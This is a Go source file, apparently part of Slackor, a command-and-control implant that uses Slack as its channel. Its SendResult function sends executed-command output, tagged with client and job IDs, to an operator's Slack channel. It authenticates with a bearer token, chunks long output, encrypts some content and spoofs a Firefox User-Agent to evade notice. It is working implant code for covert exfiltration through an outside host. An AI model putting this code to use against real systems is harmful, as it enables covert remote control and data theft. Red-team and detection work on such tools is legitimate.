package slack

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Coalfire-Research/Slackor/internal/config"
	"github.com/Coalfire-Research/Slackor/internal/crypto"
)

// SendResult sends a result back to the responses channel in Slack
func SendResult(clientID, jobID, cmdType, output string) { //Sends a response back to the responses channel
	client := &http.Client{Timeout: time.Second * 10}
	URL := "https://slack.com/api/chat.postMessage"
	v := url.Values{}
	v.Set("channel", config.ResponseChannel)
	info := clientID + ":" + jobID + ":" + cmdType + ":" + output

	if len(info) < 4000 { // If characters are less than 4K, leave it alone
		v.Set("text", info)
		//If it has more than 4K and less than 30K, prepend the client and job info as it will get posted
		// as a multi-part message

	} else if len(info) < 30000 {
		info := clientID + ":" + jobID + ":" + "cont" + ":" + output
		index := 4000
		for i := 0; i+index < len(info); i++ {
			info = info[:index] + clientID + ":" + jobID + ":" + "cont:" + info[index:]
			index = index + 4000
		}
		v.Set("text", info)

	} else { //If the size is over 30K characters, it's too big to print.
		message := "Output too long.  Consider writing command output to a file and downloading it."
		encryptedOutput, _ := crypto.Encrypt([]byte(message))
		info := clientID + ":" + jobID + ":" + cmdType + ":" + encryptedOutput
		v.Set("text", info)
	}
	//pass the values to the request's body
	fmt.Println("Sending result...")
	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
	req.Header.Add("Authorization", "Bearer "+config.Bearer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	_, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
}
